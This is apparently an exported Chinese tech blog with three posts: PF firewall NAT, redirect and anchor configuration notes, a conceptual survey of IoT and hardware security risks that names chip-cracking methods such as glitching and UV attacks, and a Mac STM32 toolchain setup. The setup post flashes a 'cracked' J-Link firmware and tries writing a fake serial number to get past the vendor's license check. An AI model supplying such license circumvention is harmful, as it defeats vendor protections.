示例2：推荐用法(tl0为外部网卡，dc0为内部网卡,dc0:network表示dc0的整个网段。(tl0)表示当tl0网卡的IP变动时，可以更新到规则库中。)nat on tl0 from dc0:network to any -&gt; (tl0) 双向映射 (1:1 映射)双向映射可以通过使用binat规则建立。Binat规则建立一个内部地址和外部地址一对一的映射。和NAT规则不同，binat规则中的tcp和udp端口不会被修改。web_serv_int = "192.168.1.100" web_serv_ext = "24.5.0.6" binat on tl0 from $web_serv_int to any -&gt; $web_serv_ext 转换规则例外no nat on tl0 from 192.168.1.10 to any nat on tl0 from 192.168.1.0/24 to any -&gt; 24.2.74.79 检查 NAT 状态pfctl -s state 重定向 (端口转发)外网流量转发到NAT网关内的主机。例如：rdr on tl0 proto tcp from 27.146.49.14 to any port 80 -&gt; 192.168.1.20 rdr on tl0 proto tcp from 16.114.4.89 to any port 80 -&gt; 192.168.1.22 rdr on tl0 proto tcp from 24.2.74.178 to any port 80 -&gt; 192.168.1.23 重定向和包过滤注意：转换后的数据包仍然会通过过滤引擎，根据定义的过滤规则进行阻塞或者通过。唯一的例外是如果rdr规则中使用了pass关键字，会使得重定向的数据包直接通过过滤引擎。 还要注意由于转换是在过滤之前进行，过滤引擎所看到的是在匹配rdr规则经过转换后的目标ip地址和端口的数据包。 rdr on tl0 proto tcp from 192.0.2.1 to 24.65.1.13 port 80 -&gt; 192.168.1.5 port 8000 rdr前 ：192.0.2.1(某随机端口) –&gt; 24.65.1.13:80 rdr后 ：192.0.2.1(某随机端口) –&gt; 192.168.1.5:8000 安全隐患(略)重定向和反射通常，重定向规则是用来将因特网上到来的连接转发到一个内部网络或者局域网的私有地址。例如：server = 192.168.1.40 rdr on $ext_if proto tcp from any to $ext_if port 80 -&gt; $server port 80 但是，当一个重定向规则被从局域网上的客户端进行测试时，它不会正常工作。这是因为重定向规则仅适用于通过指定端口（上述例子中的外部端口$ext_if）的数据包。从局域网上的主机连接防火墙的外部地址，并不意味着数据包会实际的通过外部接口。防火墙上的TCP/IP栈会把到来的数据包的目的地址 在通过内部接口时与它自己的IP地址或者别名进行对比检测。那样的数据包不会真的通过外部接口，栈在任何情况下也不会建立那样的通道。因而，PF永远也不会在外部接口上看到那些数据包，过滤规则由于指定了外部接口也不会起作用。 即使为内部接口配置重定向规则也达不到预期效果。当本地的客户端连接防火墙的外部地址时，初始化的TCP握手数据包是通过内部接口到达防火墙的。重定向规则 确实起作用了，目标地址被替换成了内部服务器，数据包通过内部接口转发到了内部的服务器。但源地址没有进行转换，仍然包含的是本地客户端的IP地址，因此 服务器把它的回应直接发送给了客户端。防火墙永远收不到应答不可能返回客户端信息，客户端收到的应答不是来自它期望的源（防火墙）会被丢弃，TCP握手失败，不能建立连接。 针对如上问题，有如下解决方案： 水平分割 DNS 针对内网和外网配置不同的DNS解析结果。 将服务器移到独立的本地网络 增加单独的网络接口卡到防火墙，把本地的服务器从和客户端同一个网段移动到专用的网段（DMZ）可以让本地客户端按照外部重定向连接的方法一样重定向。 TCP 代理 在防火墙上设置一个TCP代理用于接收请求，同时额外建立一条与目标服务器的连接，从而充当起中转者的角色。 简单的代理可以使用 inetd 和 nc 建立。下面的 /etc/inetd.conf 中的条目建立一个监听套接字绑定到lookback地址（127.0.0.1）和端口5000。连接被转发到服务器192.168.1.10的80端口。 127.0.0.1:5000 stream tcp nowait nobody /usr/bin/nc nc -w 20 192.168.1.10 80 下面的重定向规则转发内部接口的80端口到代理：rdr on $int_if proto tcp from $int_net to $ext_if port 80 -&gt; 127.0.0.1 port 5000 RDR和NAT结合 通过对内部接口增加NAT规则，上面说的转换后源地址不变的问题可以解决。 rdr on $int_if proto tcp from $int_net to $ext_if port 80 -&gt; $server no nat on $int_if proto tcp from $int_if to $int_net nat on $int_if proto tcp from $int_net to $server port 80 -&gt; $int_if 这会导致由客户端发起的初始化连接在收到内部接口的返回数据包时转换回来，客户端的源ip地址被防火墙的内部接口地址代替。内部服务器会回应防火墙的内部 接口地址，在转发给本地客户端时可以反转NAT和RDR。这个结构是非常复杂的，因为它为每个反射连接产生了2个单独的状态。必须小心配置防止NAT规则 应用到了其他流量，例如连接由外部发起（通过其他的重定向）或者防火墙自己。注意上面的rdr规则会导致TCP/IP栈看到来自内部接口带有目的地址是内部网络的数据包。 规则生成捷径PF提供了许多方法来进行规则集的简化。一些好的例子是使用宏和列表。另外，规则集的语言或者语法也提供了一些使规则集简化的捷径。首要的规则是，规则集越简单，就越容易理解和维护。 使用宏 (略)使用列表 (略)PF 语法 减少关键字 # 原语法block in all block out all# 简化语法 没有指明方向即为双向。block all # ---------------------------------# 原语法block in on rl0 all pass in quick log on rl0 proto tcp from any to any port 22 keep state # 简化语法 "from any to any" 和 "all" 在规则中省略。block in on rl0 pass in quick log on rl0 proto tcp to port 22 keep state Return 简化 # 用于阻塞数据包，回应TCP RST或者ICMP不可到达的规则集。 block in all block return-rst in proto tcp all block return-icmp in proto udp all block out all block return-rst out proto tcp all block return-icmp out proto udp all # 简化语法 当PF看到return关键字，PF可以智能回复合适应答，或者完全不回复，取决于要阻塞的数据包使用的协议block return 关键字顺序 # 在大多数情况下，关键字的顺序是非常灵活的。pass in log quick on rl0 proto tcp to port 22 flags S/SA keep state queue ssh label ssh # 也可以这么写pass in quick log on rl0 proto tcp to port 22 queue ssh keep state label ssh flags S/SA 运行选项运行选项是控制pf操作的选择。这些选项在pf.conf中使用set指定。 set block-policy option设定过滤规则中指定的block动作的默认行为。 注意单独的过滤规则可以重写默认的响应。 drop - 数据包悄然丢弃. return - TCP RST 数据包返回给遭阻塞的TCP数据包，ICMP不可到达数据包返回给其他。 set debug option设定pf的调试级别。 none - 不显示任何调试信息。 urgent - 为严重错误产生调试信息，这是默认选择。 misc - 为多种错误产生调试信息。（例如，收到标准化/整形的数据包的状态，和产生失败的状态）。. loud - 为普通条件产生调试信息（例如，收到被动操作系统检测信息状态）。 set fingerprints file设定应该装入的进行操作系统识别的操作系统特征文件来，默认是 /etc/pf.os. set limit option value frags - 在内存池中进行数据包重组的最大数目。默认是5000。 src-nodes - 在内存池中用于追踪源地址（由stick－address 和 source-track选项产生）的最大数目，默认是10000。 states - 在内存池中用于状态表（过滤规则中的keep state）的最大数目，默认是10000。 set loginterface interface设定PF要统计进/出流量和放行/阻塞的数据包数目的接口。同一时间只能统计一个接口。注意不管loginterface是否设置，match、bad-offset等计数器和状态表计数器总会被记录。 set optimization option为以下的网络环境优化PF： normal - 适用于绝大多数网络，这是默认项。 high-latency - 高延时网络，例如卫星连接。 aggressive - 自状态表中主动终止连接。这可以大大减少繁忙防火墙的内存需求，但要冒空闲连接被过早断开的风险。 conservative - 特别保守的设置。这可以避免在内存需求过大时断开空闲连接，会稍微增加CPU的利用率。 set ruleset-optimization optionControl operation of the PF ruleset optimizer. none - disable the optimizer altogether. basic - enables the following ruleset optimizations: remove duplicate rules remove rules that are a subset of another rule combine multiple rules into a table when advantageous re-order the rules to improve evaluation performance profile - uses the currently loaded ruleset as a feedback profile to tailor the ordering of quick rules to actual network traffic.Starting in OpenBSD 4.2, the default is basic. See pf.conf(5) for a more complete description. set skip on interfaceSkip all PF processing on interface. This can be useful on loopback interfaces where filtering, normalization, queueing, etc, are not required. This option can be used multiple times. By default this option is not set. set state-policy option设定PF在状态保持时的行为。这种行为可以被单条规则所改变。 if-bound - 状态绑定到产生它们的接口。如果流量匹配状态表种条目但不是由条目中记录的接口通过，这个匹配会失败。数据包要么匹配一条过滤规则，或者被丢弃/拒绝。 group-bound - 行为基本和if-bound相同，除了数据包允许由同一组接口通过，例如所有的ppp接口等。 floating - 状态可以匹配任何接口上的流量。只要数据包匹配状态表条目，不管是否匹配它通过的接口，都会放行。这是默认的规则。 set timeout option value interval - seconds between purges of expired states and packet fragments. The default is 10. frag - seconds before an unassembled fragment is expired. The default is 30. src.track - seconds to keep a source tracking entry in memory after the last state expires. The default is 0 (zero). 例如:set timeout interval 10set timeout frag 30set limit &#123; frags 5000, states 2500 &#125; set optimization high-latencyset block-policy returnset loginterface dc0set fingerprints "/etc/pf.os.test" set skip on lo0set state-policy if-bound 流量整形 (数据包标准化)流量整形是将数据包标准化避免最终的数据包出现非法的目的。流量整形指引同时也会重组数据包碎片，保护某些操作系统免受某些攻击，丢弃某些带有非法联合标记的TCP数据包。 scrub in all 对所有接口上的数据包进行流量整形。 选项 no-df 在IP数据包头中清除不分片位的设置。某些操作系统已知产生设置不分片位的分片数据包。尤其是对于NFS。流量整形（scrub）会丢弃这类数据包除非设 置了no-df选项。某些操作系统产生带有不分片位和用0填写IP包头中分类域，推荐使用no-df和random-id 联合使用解决。 random-id 用随机值替换某些操作系统输出数据包中使用的可预测IP分类域的值这个选项仅适用于在选择的数据包重组后不进行分片的输入数据包。 min-ttl num 增加IP包头中的最小存活时间（TTL）。 max-mss num 增加在TCP数据包头中最大分段值（MSS）。 fragment reassemble 在传递数据包到过滤引擎前缓冲收到的数据包碎片，重组它们成完整的数据包。优点是过滤规则仅处理完整的数据包，忽略碎片。缺点是需要内存缓冲数据包碎片。这是没有设置分片选项时的默认行为。这也是能和NAT一起工作的唯一分片选项。 fragment crop 导致重复的碎片被丢弃，重叠的被裁剪。与碎片重组不同，碎片不会被缓冲，而是一到达就直接传递。 fragment drop-ovl 跟 fragment crop 相似，除了所有重复和重叠的碎片和其他更多的通信碎片一样被丢弃。 reassemble tcp TCP连接状态标准化。当使用了 scrub reassemble tcp时，方向（进/出）不用说明，会执行下面的标准化过程： 连接双方都不允许减少它们的IP TTL值。这样做是为了防止攻击者发送数据包到防火墙，影响防火墙保持的连接状态，使数据包在到达目的主机前就过期。所有数据包的TTL都为了这个连接加到了最大值。 用随机数字调整TCP数据包头中的 RFC1323 时间戳。这可以阻止窃听者推断主机在线的时间和猜测NAT网关后面有多少主机。 示例：scrub in on fxp0 all fragment reassemble min-ttl 15 max-mss 1400 scrub in on fxp0 all no-dfscrub on fxp0 all reassemble tcp 锚（Anchors）除了主规则集，PF也提供子规则集。 由于子规则集能通过pfctl动态操作，所以可以通过子规则集动态的调整filter、nat、rdr和binat规则。 子规则集通过使用锚（Anchor）来附加到主规则集。有四种类型的anchor 规则： anchor name - evaluate(解析)锚中的所有过滤器规则 binat-anchor name - 评估锚名称中的所有binat规则 nat-anchor name - 评估锚名称中的所有nat规则 rdr-anchor name - 评估锚名称中的所有rdr规则 Anchor可以嵌套，允许子规则集串联起来。anchor规则在当前位置进行解析，也就是说锚点下的规则是受限于锚规则的。(大概理解) Anchorsanchor是一个过滤器和/或转换规则、表、其他anchors的集合，并进行了命名。 当PF在主规则集中遇到anchor规则时，它将评估(evaluate)anchor中包含的规则。 示例：ext_if = "fxp0"block on $ext_if all # 默认拒绝所有的进出流量。pass out on $ext_if all keep state anchor goodguys # 允许符合goodguys锚规则的流量出。 anchor的三种使用方式： using a load rule # 从文本文件中读取规则，并声明一个名称。先声明anchor名称，再载入规则。anchor goodguys # 声明anchor名称load anchor goodguys from "/etc/anchor-goodguys-ssh" # 为anchor载入具体的规则 using pfctl &gt; echo "pass in proto tcp from 192.0.2.3 to any port 22" | pfctl -a goodguys -f -# 也可以从文本中载入&gt; cat &gt;&gt; /etc/anchor-goodguys-wwwpass in proto tcp from 192.0.2.3 to any port 80pass in proto tcp from 192.0.2.4 to any port &#123; 80 443 &#125;&gt; pfctl -a goodguys -f /etc/anchor-goodguys-www 内联规则 allow = "&#123; 192.0.2.3 192.0.2.4 &#125;"anchor "goodguys" &#123; anchor &#123; # 内联anchor可以匿名 pass in proto tcp from 192.0.2.3 to port 80 &#125; pass in proto tcp from $allow to port 22 #宏变量不可以跨anchor读取,此处为内联anchor，可行。&#125;------------------# 由于锚可以嵌套，因此可以指定子锚。anchor "spam/*" # 锚内所有规则。# 锚内执行的操作只作用于本锚内规则。另外，主规则集内移除锚点不会清除依存于该锚的规则和子锚。除非使用 pfctl -F 进行flush。 锚定选项配置ssh锚，声明只允许通过来之fxp0接口的22端口流量。ext_if = "fxp0"block on $ext_if allpass out on $ext_if all keep stateanchor ssh in on $ext_if proto tcp from any to any port 22 后续添加的ssh锚中的规则如下：&gt; echo "pass in from 192.0.2.10 to any" | pfctl -a ssh -f - 尽管这个规则没有指定接口、协议、端口，但由于ssh锚规则的定义，所以192.0.2.10只能连接SSH。 同样的语法能用于内联anchor。allow = "&#123; 192.0.2.3 192.0.2.4 &#125;"anchor "goodguys" in proto tcp &#123; # tcp 入流量 anchor proto tcp to port 80 &#123; # to80端口 pass from 192.0.2.3 # from 192.0.2.3 通过 &#125; # 合起来就是：允许192.0.2.3访问内部的tcp 80。 anchor proto tcp to port 22 &#123; pass from $allow &#125; # 允许192.0.2.3和192.0.2.4访问内部的tcp 22。&#125; 操作已命名规则集&gt; pfctl -a ssh -s rules # 罗列ssh锚中的过滤规则&gt; pfctl -a ssh -F rules # 刷新ssh锚中的过滤规则 日志（Logging）（略）FTP问题（Issues with FTP） (略) 参考资料： https://www.freebsdchina.org/forum/topic_24641.html http://murusfirewall.com/Documentation/OS%20X%20PF%20Manual.pdf https://man.openbsd.org/pfctl https://ikawnoclast.com/security/mac-os-x-pf-firewall-avoiding-known-bad-guys/ http://www.hanynet.com/icefloor/]]></content>
      <tags>
        <tag>pf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[智能硬件安全一瞥]]></title>
    <url>%2F2018%2F%E6%99%BA%E8%83%BD%E7%A1%AC%E4%BB%B6%E5%AE%89%E5%85%A8%E4%B8%80%E7%9E%A5%2F</url>
    <content type="text"><![CDATA[智能硬件安全算是一个相对较新的领域，既有传统的安全问题(云服务器安全、APP安全、通讯安全等)，又有属于电子产品范畴的安全。简单看看其涉及到的知识领域，评估下自己如何在该领域循序渐进。 智能硬件安全概览随着万物互联的物联网思维发酵，原本自成系统的硬件设备及其自有网络（Bluetooth、Zigbee、Can总线等）接入到互联网中，打破原本隔离的状态，成为了今天大家熟知的智能硬件。使其在得到互联网加持的同时，也相应的需要面对互联网中的安全威胁。例如：关注度比较高的车联网安全，很多问题便是由于原本封闭安全的can总线网络接入到互联网之后带来的。 目前的智能硬件，其一般情况下部署架构均如图所示，个别情况可能缺少云端或者APP端。 所以，谈论智能硬件安全，其实三端点(终端设备+云端+APP) + 三条线(三者之间的通讯)所涉及的安全问题。 点·终端设备安全你以为硬件设备都长什么样呢? 如下便是扒光外壳后硬件本来的样子，其实这就是赫赫大名的树莓派。 接口安全 有些硬件可能为了维修方便，都留有编程口（JTAG、ISP的等）、数据通信口（USB、SPI、CAN、UART等有线通信及WIFI、Zigbee、Bluetooth等无线通信）。这些接口未做相应的防护，导致终端直接面临安全风险。 固件安全 固件（运行在硬件上的程序代码）安全主要关注点应该是固件的保密性措施。固件被盗被逆向，那么自家产品的复制品很快也就出来了。对于长开发周期的电子行业来讲，这是比较沉重的打击。 一般的，有三种获取固件的方式： 官网链接下载 捕获升级包 直接用调试器从硬件读取 IC芯片破解 这部分与固件安全有一定的交集，但相对于上一点有所区别，较多的依赖芯片厂商，硬件厂商需要认真评估芯片的安全性，并考虑做一些额外处理（如清除芯片型号、充分使用芯片安全特性等） 【芯片漏洞】 如利用单片机时序漏洞使单片机停留在解密状态；空白区域插入代码，将片内程序读取并传送出来。 【探针技术】 直接破开芯片外壳，暴露内部连接，然后观察、操控、干扰芯片。 【过错产生技术】 使用异常工作条件来使处理器出错，然后提供额外的访问来进行攻击。使用最广泛的过错产生攻击手段包括电压冲击和时钟冲击。电源和时钟瞬态跳变可以在某些处理器中影响单条指令的解码和执行。 【紫外线攻击】 紫外线攻击也称为UV攻击方法，就是利用紫外线照射芯片，让加密的芯片变成了不加密的芯片，然后用编程器直接读出程序。这种方法适合OTP的芯片。 【其它方法】 如熔丝恢复、修改加密线路、电子探针等。 固件漏洞 关于固件漏洞，大家应该相对更加耳熟能详的，经常爆出的路由器漏洞便属于此类。 固件篡改 &amp; 降级攻击 如果固件代码被攻击者篡改，重新烧录或伪装为升级服务器，终端便沦为肉鸡。降级攻击主要是将固件降级到存在漏洞的版本，以便攻击者进行利用。 数据存储不安全 硬件终端的丢失与失窃是非常正常的事，然而这些终端中却往往有用户非常敏感的个人数据。如果终端设备未对数据进行加密存储，那么用户信息、会话令牌，甚至明文口令都可能被直接读取。 点·APP安全 应用反编译 大多数APP客户端安全问题都源于APP被反编译，虽然没有百分百杜绝反编译的措施，但堆高破解门槛还是需要考虑的。 组件类漏洞 Activity公开组件暴露 Broadcast Receiver组件调用漏洞 Service组件任意调用漏洞 敏感信息泄露 硬编码敏感信息泄露漏洞 外部存储设备信息泄露漏洞 PendingIntent包含隐式Intent信息泄露漏洞 其它 本地拒绝服务漏洞 Android App allowBackup安全漏洞 运行其它可执行程序漏洞 点·云端安全也就是服务端主机的安全。这是白帽子聚集最多，也是最成熟的信息安全领域。 基础架构类安全问题主机漏洞、中间件漏洞、协议漏洞、数据库漏洞等等。。。 登录体系类安全问题账号注册/登录漏洞、弱口令、验证码安全等等。。。 权限认证类安全问题未授权访问、越权访问、支付漏洞等等。。。 输入输出类安全问题SQL注入、XSS、XXE、反序列化、文件上传、文件包含、CSRF、弱口令等等。。。 线·APP - Cloud这部分的安全问题，在移动端测试中经常关注到，大部分也就是云端安全的问题。 线·IoT - Cloud这部分通信与APP-Cloud直接的通信的主要区别在于，终端到服务器直接的数据传递多以API接口为主，通信协议使用的相对多一些，如XMPP、MQTT、COAP、RESTful HTTP等，这些通信协议的安全性还有待考验。 同时，由于传统的嵌入式开发工程师在安全开发方便的经验相对缺失，以及已有程序未考虑现有应用环境带来的安全问题。 数据传输未加密在智能硬件的使用过程中，网络环境可能不断变化，极有可能连接上被人嗅探、监控的网络。所以传输的数据必须是加密的。 秘钥保护措施不当有些智能硬件考虑到了加密传输，但却使用对称加密方式。如果秘钥存放不当，那么加密传输也就变得毫无意义。 业务漏洞从传统的单机应用接入到云端之后，功能变得更多更复杂的同时，权限的管理也变得复杂，如果服务端未做充分的验证工作，将存在较多问题。 身份认证措施不当每个硬件都有自己的一个身份标识，如果该身份标识未能安全的运用于身份认证，那么将很容易引起越权类漏洞。如：以硬件Mac地址或产品序列号作为会话认证标志的情况。 越权漏洞服务端和终端上权限管控不当导致越权漏洞，如免费使用服务、越权控制别人的设备等等。 线·IoT - APP很多情况下也是因为新的应用环境导致的认知不足所致。 身份认证措施不当移动端与终端的绑定需要的认证信息必须自个安全的进行存储，如有必要考虑其他认证措施同时使用。避免硬件被别人控制。 未授权访问某些智能硬件的服务对同一局域网其它设备开放性的访问。这显然也是不安全的，毕竟WiFi密码并不安全。 数据传输未加密同“IOT - Cloud” 技能图按照个人的粗浅理解，简单绘制了智能硬件安全白帽子的成长路线图。抛砖引玉，大咖们轻拍！ 【参考资料】 http://www.eefocus.com/icpojie/blog/17-02/405496_d2475.htmlhttp://blog.knownsec.com/Knownsec_RD_Checklist/https://zhuanlan.zhihu.com/p/22273147http://www.freebuf.com/articles/terminal/117262.html]]></content>
      <tags>
        <tag>IoT</tag>
        <tag>硬件安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mac搭建STM32编译及调试工具(含led-demo)]]></title>
    <url>%2F2018%2FMac%E6%90%AD%E5%BB%BASTM32%E7%BC%96%E8%AF%91%E5%8F%8A%E8%B0%83%E8%AF%95%E5%B7%A5%E5%85%B7-%E5%90%ABled-demo%2F</url>
    <content type="text"><![CDATA[因为一些原因，打算温习一下多年不碰的嵌入式开发，故而翻出了积灰的山寨版J-Link V8和STM32f103zet6核心板。由于目前使用的是Mac电脑，而自己又不想使用虚拟机，故而便有了如下折腾~~~ 前言在Windows上有IAR、Keil等强大的IDE，但在Mac上却什么都没有。 可能使用Eclipse+插件的形式就算是最好的选择了，只是个人对Eclipse不太感冒。经过一番搜寻，最终在以 编辑器 + gcc-arm-none-eabi + openOCD的模式完成了星星点灯。 编译工具工具地址 ： GNU Arm Embedded Toolchain 直接下载Mac版本（当前版本为：gcc-arm-none-eabi-7-2017-q4-major-mac.tar.bz2），解压缩到一个目录。➜ gcc-arm-none-eabi pwd/Users/bingo/EmbeddedDev/toolchain/gcc-arm-none-eabi➜ gcc-arm-none-eabi tree -L 2.├── arm-none-eabi│ ├── bin│ ├── include│ ├── lib│ └── share├── bin│ ├── arm-none-eabi-addr2line│ ├── arm-none-eabi-ar│ ├── arm-none-eabi-as│ ├── arm-none-eabi-c++│ ├── arm-none-eabi-c++filt│ ├── arm-none-eabi-cpp│ ├── arm-none-eabi-elfedit│ ├── arm-none-eabi-g++│ ├── arm-none-eabi-gcc│ ├── arm-none-eabi-gcc-7.2.1│ ├── arm-none-eabi-gcc-ar│ ├── arm-none-eabi-gcc-nm│ ├── arm-none-eabi-gcc-ranlib│ ├── arm-none-eabi-gcov│ ├── arm-none-eabi-gcov-dump│ ├── arm-none-eabi-gcov-tool│ ├── arm-none-eabi-gdb│ ├── arm-none-eabi-gdb-py│ ├── arm-none-eabi-gprof│ ├── arm-none-eabi-ld│ ├── arm-none-eabi-ld.bfd│ ├── arm-none-eabi-nm│ ├── arm-none-eabi-objcopy│ ├── arm-none-eabi-objdump│ ├── arm-none-eabi-ranlib│ ├── arm-none-eabi-readelf│ ├── arm-none-eabi-size│ ├── arm-none-eabi-strings│ └── arm-none-eabi-strip├── lib│ ├── gcc│ ├── libcc1.0.so│ └── libcc1.so -&gt; libcc1.0.so└── share ├── doc └── gcc-arm-none-eabi11 directories, 31 files 为了便于使用，将bin目录添加到系统PATH中，即添加如下指令到.zshrc文件。export PATH=/Users/bingo/EmbeddedDev/toolchain/gcc-arm-none-eabi/bin:$PATH 检验安装➜ ~ arm-none-eabi-gcc --versionarm-none-eabi-gcc (GNU Tools for Arm Embedded Processors 7-2017-q4-major) 7.2.1 20170904 (release) [ARM/embedded-7-branch revision 255204]Copyright (C) 2017 Free Software Foundation, Inc.This is free software; see the source for copying conditions. There is NOwarranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. 至此，编译工具安装完成。 调试工具鉴于我手头的JTAG调试工具是J-Link,所以有两个工具可选. SEGGER官方工具(J-Link Commander) 开源调试工具 (openOCD) J-Link Commander如果使用的是官版J-Link，使用J-Link Commander可能会比较好。但我看了下淘宝上就没有正版的JLink，全是克隆版。因为当前版本的工具有license校验。没有正确的SN码，那么将不能使用，提示“The connected J-Link is defective. Proper operation cannot be guaranteed. Please get in touch with support@segger.com and send a screenshot of this dialog with the e-mail.”。如下： 网上有很多所谓的攻略全都没用，除非使用低版本工具。也正是在这个过程中，我按照那些个教程重刷了JLink固件，这又是一堆坑。（后文有记录） 最终的情况就是弃用了这个工具，使用openOCD。 openOCD简单来讲，openOCD这个开源工具就是一个万能调试器，兼容如ST-Link,J-Link等等众多硬件。如果需要使用多种调试工具的话，那么还是直接使用这个工具更好。 官方并没有提供编译好的安装包，所以下载了源码进行安装，结果我安装的时候需要遇到了一些问题。 配置问题 按照INSTALL文件中的./configure &amp;&amp; make &amp;&amp; make install 是没办法成功的。进一步查看冗长的说明，./configure必须带参数才行。 ./configure --enable-maintainer-mode --enable-jlink 至少需要带上--enable-jlink。 成功的时候，结果如下，至少得看到SEGGER J-Link Programmer yes才行。OpenOCD configuration summary--------------------------------------------------MPSSE mode of FTDI based devices yes (auto)ST-Link JTAG Programmer yes (auto)TI ICDI JTAG Programmer yes (auto)Keil ULINK JTAG Programmer yes (auto)Altera USB-Blaster II Compatible yes (auto)Versaloon-Link JTAG Programmer yes (auto)OSBDM (JTAG only) Programmer yes (auto)eStick/opendous JTAG Programmer yes (auto)Andes JTAG Programmer yes (auto)USBProg JTAG Programmer yes (auto)Raisonance RLink JTAG Programmer yes (auto)Olimex ARM-JTAG-EW Programmer yes (auto)CMSIS-DAP Compliant Debugger yes (auto)Altera USB-Blaster Compatible yes (auto)ASIX Presto Adapter yes (auto)OpenJTAG Adapter yes (auto)SEGGER J-Link Programmer yes make报错openocd-0.10.0 makeMakefile:4252: warning: overriding commands for target `check-recursive'Makefile:3665: warning: ignoring old commands for target `check-recursive' cd . &amp;&amp; /bin/sh /Users/bingo/EmbeddedDev/toolchain/openocd-0.10.0/missing automake-1.15 --gnuconfigure.ac:16: error: version mismatch. This is Automake 1.15.1,configure.ac:16: but the definition used by this AM_INIT_AUTOMAKEconfigure.ac:16: comes from Automake 1.15. You should recreateconfigure.ac:16: aclocal.m4 with aclocal and run automake again.Makefile.am:46: warning: wildcard $(srcdir: non-POSIX variable nameMakefile.am:46: (probably a GNU make extension)WARNING: 'automake-1.15' is probably too old. You should only need it if you modified 'Makefile.am' or 'configure.ac' or m4 files included by 'configure.ac'. The 'automake' program is part of the GNU Automake package: &lt;http://www.gnu.org/software/automake&gt; It also requires GNU Autoconf, GNU m4 and Perl in order to run: &lt;http://www.gnu.org/software/autoconf&gt; &lt;http://www.gnu.org/software/m4/&gt; &lt;http://www.perl.org/&gt;make: *** [Makefile.in] Error 1 也许我降级automake的版本可以通过，不过灵机一动，试了试:brew install openocd 结果困了许久的问题，一下子就解决了。 想抽自己巴掌，，， 果然homebrew才是简单正确的姿势。 除了用命令行直接安装以外，还可以考虑从https://github.com/gnu-mcu-eclipse/openocd/releases下载非官方的安装包。 没试过，但应该没问题。 openOCD使用 交互模式openocd -f interface/jlink.cfg -f target/stm32f1x.cfg 带上调试器和目标芯片相关的cfg文件即可。 interface和target目录位于/usr/local/Cellar/open-ocd/0.10.0/share/openocd/scripts/下，里面存放了支持的Debuger和Chip。 openocd -f interface/jlink.cfg -f target/stm32f1x.cfgOpen On-Chip Debugger 0.10.0Licensed under GNU GPL v2For bug reports, read http://openocd.org/doc/doxygen/bugs.htmlInfo : auto-selecting first available session transport "jtag". To override use 'transport select &lt;transport&gt;'.adapter speed: 1000 kHzadapter_nsrst_delay: 100jtag_ntrst_delay: 100none separatecortex_m reset_config sysresetreqInfo : No device selected, using first device.Info : J-Link ARM V8 compiled Nov 28 2014 13:44:46Info : Hardware version: 8.00Info : VTarget = 3.325 VInfo : clock speed 1000 kHzInfo : JTAG tap: stm32f1x.cpu tap/device found: 0x3ba00477 (mfg: 0x23b (ARM Ltd.), part: 0xba00, ver: 0x3)Info : JTAG tap: stm32f1x.bs tap/device found: 0x06414041 (mfg: 0x020 (STMicroelectronics), part: 0x6414, ver: 0x0)Info : stm32f1x.cpu: hardware has 6 breakpoints, 4 watchpoints 如上显示表示连接正常，系统后台开启了4444的端口。使用telnet连接到4444端口后便可以进行交互。➜ ~ telnet localhost 4444Trying 127.0.0.1...Connected to localhost.Escape character is '^]'.Open On-Chip Debugger&gt; help # 查看支持的命令，超多，此处不列出。&gt; halt # 挂起目标芯片target halted due to debug-request, current mode: ThreadxPSR: 0x21000000 pc: 0x08008dca msp: 0x2000ffe8&gt; flash write_image erase stm32_LED.hex # 烧录flashauto erase enableddevice id = 0x10036414flash size = 512kbytesPadding image section 0 with 1410 byteswrote 40960 bytes from file stm32_LED.hex in 1.682081s (23.780 KiB/s)&gt; reset # 复位JTAG tap: stm32f1x.cpu tap/device found: 0x3ba00477 (mfg: 0x23b (ARM Ltd.), part: 0xba00, ver: 0x3)JTAG tap: stm32f1x.bs tap/device found: 0x06414041 (mfg: 0x020 (STMicroelectronics), part: 0x6414, ver: 0x0)&gt; exit # 退出连接Connection closed by foreign host. 命令模式 把交互模式中执行过的命令依次添加到命令选项中即可。openocd -f interface/jlink.cfg -f target/stm32f1x.cfg -c init -c halt -c "flash write_image erase ./stm32_LED.hex" -c reset -c shutdown J-Link固件烧录 原本我J-Link的好好的，但为了解决J-Link Commander校验克隆板的问题，按照网上的教程给清空了(教程很多，自行搜索)，然而最后也没卵用。期间多次重写烧录J-Link固件。PS：我的J-Link版本是V8，内部芯片为：AT91SAM7S64 烧录工具 在Windows和Linux上有ATMEL的SAM-BA编程器，但没有Mac版本的，理论上Linux版本的可以拿过来安装，但貌似需要X11。 另外一个工具：BOSSA https://github.com/shumatech/BOSSA 下载安装即可。 固件 CSDN上有不少固件，但都需要积分下载。 这里提供一个能用的：jlink-v8cracksn.bin 烧录固件 使用BOSSA的界面版工具挺好用的，但不知怎么回事（疑似在选择设备的时候，选中了蓝牙），就闪退，后来一直闪退。 最后只能使用命令行进行刷如固件。➜ ~ ll /dev/tty.* # 找到设备crw-rw-rw- 1 root wheel 21, 0 Jan 16 04:17 /dev/tty.Bluetooth-Incoming-Portcrw-rw-rw- 1 root wheel 21, 0 Jan 16 04:17 /dev/tty.usbmodem1411 # j-link设备➜ ~ bossac -u -e -w -v -b jlink-v8cracksn.bin -p tty.usbmodem1411 之后安装网上的说法，在JLinkExe中执行exec setsn=20180116(随便数值)来写入sn,然而还是不行。 最后我重新打开JLinkExe接受了固件升级确认。 如此虽然没解决任何问题，但还好J-Link并没被我搞成砖头。 星星点灯demostm32相关的资料可以到http://www.stmcu.org查找并下载，比st官网方便。 最关键的是下载 stsw-stm32054 - 标准外围库，这是目前最新的固件库了，尽管里面很多内容还是2011年的。 创建项目新建一个项目目录，并将固件中的文件导入➜ LED tree.├── CMSIS│ ├── core_cm3.c│ ├── core_cm3.h│ ├── stm32f10x.h│ ├── system_stm32f10x.c│ └── system_stm32f10x.h├── FWLib│ ├── inc│ │ ├── misc.h│ │ ├── stm32f10x_gpio.h│ │ └── .... # 省略│ └── src│ ├── misc.c│ ├── stm32f10x_gpio.c│ └── .... # 省略├── Makefile├── Script│ └── stm32f10e_flash.ld├── Startup│ └── startup_stm32f10x_hd.s└── User ├── main.c ├── stm32f10x_conf.h ├── stm32f10x_it.c └── stm32f10x_it.h main.c#include "stm32f10x.h"GPIO_InitTypeDef GPIO_InitStructure;void delay(int n)&#123; n =n * 1000000; while(n--)&#123; &#125;&#125;int main(void)&#123; RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOC, ENABLE); 